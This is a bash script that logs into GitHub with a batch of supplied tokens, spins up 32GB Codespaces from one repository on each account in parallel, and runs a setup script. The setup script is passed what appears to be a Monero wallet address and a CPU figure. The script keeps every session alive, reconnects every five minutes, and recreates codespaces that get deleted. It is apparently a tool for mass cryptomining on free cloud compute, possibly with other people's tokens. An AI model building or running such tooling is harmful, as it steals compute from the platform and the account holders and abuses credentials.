REPO="niaalae/dock"
BRANCH="main"
MACHINE_TYPE="standardLinux32gb"
SETUP_CMD='sudo /workspaces/dock/setup.sh 49J8k2f3qtHaNYcQ52WXkHZgWhU4dU8fuhRJcNiG9Bra3uyc2pQRsmR38mqkh2MZhEfvhkh2bNkzR892APqs3U6aHsBcN1F 85'

if [ $# -lt 1 ]; then
  echo "Usage: $0 <gh_token> [gh_token ...] or $0 <token_file>"
  exit 1
fi

# If first arg is a file, read tokens from it
if [ -f "$1" ]; then
  TOKENS=( $(grep -v '^#' "$1" | grep -v '^$') )
else
  TOKENS=( "$@" )
fi

run_instance() {
  GH_TOKEN="$1"
  echo "$GH_TOKEN" | gh auth login --with-token
  if [ $? -ne 0 ]; then
    echo "GitHub authentication failed for token $GH_TOKEN."
    return 1
  fi

  CODESPACE_NAME=$(gh codespace list | grep "$REPO" | grep "$BRANCH" | head -n1 | awk '{print $1}')
  if [ -z "$CODESPACE_NAME" ]; then
    echo "No existing codespace found. Creating a new one..."
    CREATE_OUTPUT=$(gh codespace create -R "$REPO" -b "$BRANCH" -m "$MACHINE_TYPE" 2>&1)
    CODESPACE_NAME=$(gh codespace list | grep "$REPO" | grep "$BRANCH" | head -n1 | awk '{print $1}')
    if echo "$CREATE_OUTPUT" | grep -q "Usage not allowed"; then
      echo "Codespace creation not allowed. Checking for running codespaces..."
      CODESPACE_NAME=$(gh codespace list | grep "$REPO" | grep "$BRANCH" | grep "Available" | head -n1 | awk '{print $1}')
      if [ -z "$CODESPACE_NAME" ]; then
        echo "No running codespace available. Exiting."
        return 1
      fi
      echo "Logging into existing running codespace: $CODESPACE_NAME"
    elif [ -z "$CODESPACE_NAME" ]; then
      echo "Failed to create codespace."
      return 1
    else
      echo "Created codespace: $CODESPACE_NAME"
    fi
  else
    echo "Reusing existing codespace: $CODESPACE_NAME"
  fi

  echo "Waiting for setup.sh to be available in the codespace..."
  while true; do
    gh codespace ssh -c $CODESPACE_NAME -- ls /workspaces/dock/setup.sh >/dev/null 2>&1
    if [ $? -eq 0 ]; then
      echo "setup.sh found. Proceeding."
      break
    fi
    echo "setup.sh not found yet. Waiting 5 seconds..."
    sleep 5
  done

  sync_and_run() {
    ssh_cmd="gh codespace ssh -c $CODESPACE_NAME -- bash -c '$SETUP_CMD; tail -f /dev/null'"
    $ssh_cmd &
    SSH_PID=$!
  }
  sync_and_run

  while true; do
    sleep 300
    if ! kill -0 $SSH_PID 2>/dev/null; then
      echo "SSH session closed. Attempting to reconnect..."
      EXISTS=$(gh codespace list | awk '{print $1}' | grep -Fx "$CODESPACE_NAME")
      if [ -z "$EXISTS" ]; then
        echo "Codespace not found. Creating a new one..."
        while true; do
          gh codespace create -R "$REPO" -b "$BRANCH" -m "$MACHINE_TYPE"
          CODESPACE_NAME=$(gh codespace list | grep "$REPO" | grep "$BRANCH" | head -n1 | awk '{print $1}')
          if [ -n "$CODESPACE_NAME" ]; then
            echo "Created codespace: $CODESPACE_NAME"
            echo "Waiting for setup.sh to be available in the codespace..."
            while true; do
              gh codespace ssh -c $CODESPACE_NAME -- ls /workspaces/dock/setup.sh >/dev/null 2>&1
              if [ $? -eq 0 ]; then
                echo "setup.sh found. Proceeding."
                break
              fi
              echo "setup.sh not found yet. Waiting 5 seconds..."
              sleep 5
            done
            break
          else
            echo "Failed to create codespace. Retrying in 10 seconds..."
            gh auth status
            if [ $? -ne 0 ]; then
              echo "GitHub token invalid. Exiting."
              return 1
            fi
            sleep 10
          fi
        done
      fi
      sync_and_run
    fi
  done
}

for TOKEN in "${TOKENS[@]}"; do
  run_instance "$TOKEN" &
done
